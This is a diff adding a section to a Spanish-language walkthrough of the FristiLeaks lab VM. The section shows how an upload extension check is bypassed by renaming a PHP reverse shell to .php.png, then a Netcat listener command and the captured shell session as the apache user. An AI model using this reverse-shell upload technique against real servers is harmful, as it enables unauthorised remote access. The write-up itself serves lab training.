@@ -236,7 +236,63 @@ Si pruebo de loguearme con esa credenciales tengo éxito y se presenta la siguie
 
 ---
 
-### **Protocolo SSH**
+Genial. ¿De que sirve poder subir un archivo de imágen a un servidor? No sirve de mucho a menos que en vez de una imágen se pueda subir algo que se ejecute del lado del servidor. Por ejemplo una shell reversa de PHP, si la persona que programó el archivo ``upload.php`` se puso las pilas entonces al tocar el botón ``Upload Image`` se debería validar que no estoy subiendo nada más que un archivo de imagén:
+
+---
+
+![img]({{ '/assets/images/Fristileaks/upload_01.png' | relative_url }}){: .center-image }*(Tratando de subir una shell inversa en PHP)*
+
+---
+
+![img]({{ '/assets/images/Fristileaks/upload_02.png' | relative_url }}){: .center-image }*(Hubiera sido muy fácil...)*
+
+---
+
+Existen varias formas de validar el tipo de contenido que se está subiendo a un servidor, las que más he visto (en mi poca experiencia) son las que chequean la extensión o las que chequean el tipo de archivo que se está subiendo ([Magic Bytes](https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/)).
+
+Hay un excelente [documento](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf) que las enumera, muestra el código detrás de cada una y muestra como hacer bypass.
+
+Voy a tener que usar **Burp Suite** para capurar el tráfico web entre las VM atacantes y victima y poder modificarlo.
+
+La opción más fácil fue agregarle la extensión .png ``php-reverse-shell.php``
+
+>**``cp php-reverse-shell.php php-reverse-shell.php.png``**
+
+Y al tratar de subir el archivo todo va Ok, el script de upload validaba la extensión de lo que se subía.
+
+---
+
+![img]({{ '/assets/images/Fristileaks/upload_03.png' | relative_url }}){: .center-image }*(Hubiera sido muy fácil...)*
+
+---
+
+Ahora solo resta acceder al link mencionado previamente habiendo abierto una sesiéon para recibir la conexión reversa con **Netcat**:
+
+>**``nc -nlvp 1234``**
+
+En el momento que se ingresa a **http://10.0.0.123/fristi/uploads/php-reverse-shell.php.png** se recibe la conexión!!
+
+```console
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.0.0.123.
+Ncat: Connection from 10.0.0.123:56200.
+Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 12:49:30 up 21:00,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.1$ whoami
+whoami
+apache
+sh-4.1$ pwd
+/
+pwd
+sh-4.1$ 
+```
+
+
 ---
 
 
